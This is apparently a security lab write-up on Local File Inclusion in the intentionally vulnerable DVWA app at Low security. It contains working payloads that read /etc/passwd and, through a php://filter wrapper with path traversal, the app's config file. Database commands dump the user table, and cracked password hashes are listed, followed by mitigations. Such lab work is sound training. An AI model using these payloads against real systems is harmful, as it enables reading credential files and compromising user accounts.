
---

# File Inclusion – DVWA Low Security

## Objective
Demonstrate Local File Inclusion (LFI) and exploitation steps to retrieve sensitive files and database credentials.

---

## Methodology
Testing was performed on the File Inclusion (Low) page of DVWA. Input was submitted via the page parameter, which is directly passed into PHP’s include() function. Payloads were crafted to safely read system files and extract configuration data in a controlled lab environment.

Steps followed:
1. Confirm LFI vulnerability.
2. Read sensitive system files.
3. Extract DVWA configuration (database credentials).
4. Use credentials to access the database and dump user information.

---

## Exploitation Steps

---

<details> <summary>Step 1: Confirm LFI with /etc/passwd</summary>

**Payload:** /etc/passwd

**URL Encoded:** %2Fetc%2Fpasswd

**Observation:**
- Raw contents of /etc/passwd displayed on the page.
- Includes system users like root, www-data, mysql.
- Normal application logic should never reveal OS files.

**Impact:**
- Confirms Local File Inclusion vulnerability.
- Attackers can read arbitrary system files.

<img width="940" height="622" alt="image" src="https://github.com/user-attachments/assets/f1b61121-f4a7-4ca3-8ff7-05d5cd1c38c1" />


</details>

<details> <summary>Step 2: Extract DVWA Database Credentials</summary>

**Payload:** php://filter/convert.base64-encode/resource=../../config/config.inc.php

**URL Encoded:** php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D..%2F..%2Fconfig%2Fconfig.inc.php

**Observation:**
- DVWA configuration file returned as Base64.
- Decoding revealed database credentials:

$_DVWA['db_server']   = '127.0.0.1';

$_DVWA['db_database'] = 'dvwa';

$_DVWA['db_user']     = 'dvwa';

$_DVWA['db_password'] = 'p@ssw0rd';

**Impact:**
- Credentials allow direct access to DVWA database.
- Attacker can extract sensitive user information and escalate attacks.

<img width="940" height="642" alt="image" src="https://github.com/user-attachments/assets/2acee3b8-d00d-4d32-ac6c-4df384cbcce6" />


<img width="791" height="685" alt="image" src="https://github.com/user-attachments/assets/c10233d1-19bd-4c57-8a4d-96ef99125864" />

</details>

<details> <summary>Step 3: Log in to Database & Dump Users</summary>

**Steps:**

**Step 1:**
- Access MariaDB inside the Docker container:
docker exec -it <container_id> bash
mysql -u dvwa -p

**Step 2:**
- Switch to DVWA database
USE dvwa;
SHOW TABLES;

**Step 3:**
- Dump all users
SELECT * FROM users;

<img width="940" height="582" alt="image" src="https://github.com/user-attachments/assets/85bdeb40-85fc-451d-8adb-3f832c37d7c3" />


<img width="940" height="335" alt="image" src="https://github.com/user-attachments/assets/af39758e-1c03-466a-860c-629e822e26ba" />


**Observation:**
- Returned usernames, hashed passwords, and profile info.
- Example MD5 hashes:

admin: 5f4dcc3b5aa765d61d8327deb882cf99
gordonb: e99a18c428cb38d5f260853678922e03

- Decoded

| User    | MD5 Hash                         | Password |
| ------- | -------------------------------- | -------- |
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123   |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | secret   |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein  |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

**Impact:**
- Full access to all DVWA user accounts.
- MD5 hashes can be trivially cracked, exposing plaintext passwords.
- Demonstrates real-world risk of LFI leading to full database compromise.

  </details>

  ---
  
**Summary:**

- DVWA Low Security is vulnerable to LFI.
- Exploitation path:

Inject path via page parameter → read system files.

Extract DVWA database credentials using php://filter.

Use credentials to dump user accounts and passwords.

- Real-world implications: full compromise of sensitive data, credential theft, and potential application takeover.

  ---
**Recommendations/Mitigations:**
1. Validate and sanitize user input: never include files directly from untrusted input.
2. Disable LFI-sensitive PHP functions: disable allow_url_include, enforce open_basedir.
3. Set proper file permissions: restrict access to configuration files.
4. Use hashed passwords with salts: prevent trivial password retrieval.
5. Increase security levels in DVWA: test and prevent LFI exploitation at higher levels.

   ---
<img width="1316" height="131" alt="file_inclusion_flow" src="https://github.com/user-attachments/assets/ad48da1d-1313-4e5e-90fa-7800c9e45428" />

